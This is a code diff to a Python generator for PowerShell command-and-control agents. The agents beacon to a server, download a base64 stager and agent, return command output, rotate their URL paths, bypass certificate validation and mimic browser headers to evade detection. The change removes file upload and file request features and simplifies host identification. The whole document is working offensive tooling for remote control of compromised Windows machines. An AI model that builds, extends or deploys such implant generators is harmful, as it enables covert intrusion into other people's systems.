@@ -6,15 +6,13 @@ import importlib.util
 import shutil
 from pathlib import Path
 
-def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="/command_result", file_upload_path="/file_upload", rotation_info=None):
+def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="/command_result", rotation_info=None):
     """Generate PowerShell agent code with secure key exchange and dynamic path rotation"""
     # Ensure all paths have leading slashes
     if not beacon_path.startswith('/'):
         beacon_path = '/' + beacon_path
     if not cmd_result_path.startswith('/'):
         cmd_result_path = '/' + cmd_result_path
-    if not file_upload_path.startswith('/'):
-        file_upload_path = '/' + file_upload_path
     
     # Add path rotation code if rotation info is provided
     rotation_enabled = rotation_info is not None
@@ -38,8 +36,6 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
         server_address=server_address,
         beacon_path=beacon_path,
         cmd_result_path=cmd_result_path,
-        file_upload_path=file_upload_path,
-        file_request_path="/file_request",
         rotation_enabled=rotation_enabled,
         rotation_id=rotation_id,
         next_rotation_time=next_rotation,
@@ -78,15 +74,16 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         "agent_path": "/raw_agent",
         "stager_path": "/b64_stager",
         "cmd_result_path": "/command_result",
-        "file_upload_path": "/file_upload",
-        "file_request_path": "/file_request"
     }
     
     if os.path.exists(url_paths_file):
         try:
             with open(url_paths_file, 'r') as f:
                 custom_paths = json.load(f)
-                url_paths.update(custom_paths)
+                # Only use the paths we need for the simplified agent
+                for key in ["beacon_path", "agent_path", "stager_path", "cmd_result_path"]:
+                    if key in custom_paths:
+                        url_paths[key] = custom_paths[key]
         except Exception as e:
             print(f"Warning: Could not load URL paths: {e}")
     
@@ -135,13 +132,11 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         except Exception as e:
             print(f"Warning: Could not load path rotation state: {e}")
     
-    # Generate agent code using templates
+    # Generate agent code using templates with simplified parameters
     agent_ps1 = generate_from_templates(
         server_address=server_address,
         beacon_path=url_paths["beacon_path"],
         cmd_result_path=url_paths["cmd_result_path"],
-        file_upload_path=url_paths["file_upload_path"],
-        file_request_path=url_paths.get("file_request_path", "/file_request"),
         rotation_enabled=rotation_enabled,
         rotation_id=str(rotation_id),
         next_rotation_time=str(next_rotation_time),
@@ -186,15 +181,13 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         f"Powershell Base64 Agent Details:\n"
         f"1. Base Command: {powershell_command}\n"
         f"2. Encryption: Dynamic key exchange (no hardcoded key)\n"
-        f"3. System Identification: Full system identification enabled\n"
+        f"3. System Identification: Simplified (hostname and IP only)\n"
         f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
         f"5. Communication Paths:\n"
         f"   - Beacon URL: {http}://{server_address}{url_paths['beacon_path']}\n"
         f"   - Agent Download URL: {http}://{server_address}{url_paths['agent_path']}\n"
         f"   - Stager URL: {http}://{server_address}{url_paths['stager_path']}\n"
         f"   - Command Result URL: {http}://{server_address}{url_paths['cmd_result_path']}\n"
-        f"   - File Upload URL: {http}://{server_address}{url_paths['file_upload_path']}\n"
-        f"   - File Request URL: {http}://{server_address}{url_paths.get('file_request_path', '/file_request')}\n"
         f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
         f"7. Headers: Legitimate web browsing headers included\n"
         f"8. Error Handling: Enhanced error reporting enabled\n"
@@ -210,13 +203,13 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     with open(details_file_path, 'w') as f:
         f.write(details)
     
-    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: Dynamic key exchange (no hardcoded key)\nIdentity: Full system identification enabled"
+    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: Dynamic key exchange (no hardcoded key)\nIdentity: Simple hostname and IP identification"
     
     return f"Powershell Base64 agent generated and saved to {details_file_path}\n{result}"
 
-def generate_from_templates(server_address, beacon_path, cmd_result_path, file_upload_path,
+def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            rotation_enabled, rotation_id, next_rotation_time, rotation_interval,
-                           beacon_interval, jitter_percentage, max_failures, max_backoff, file_request_path="/file_request"):
+                           beacon_interval, jitter_percentage, max_failures, max_backoff):
     """Generate the PowerShell agent code from templates"""
     
     # Get template paths
@@ -247,16 +240,12 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path, file_u
         path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
         path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", beacon_path)
         path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
-        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
-        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
     
     # Fill in the agent template with all values
     agent_code = agent_template
     agent_code = agent_code.replace("{{SERVER_ADDRESS}}", server_address)
     agent_code = agent_code.replace("{{BEACON_PATH}}", beacon_path)
     agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
-    agent_code = agent_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
-    agent_code = agent_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
     agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
     agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
     agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
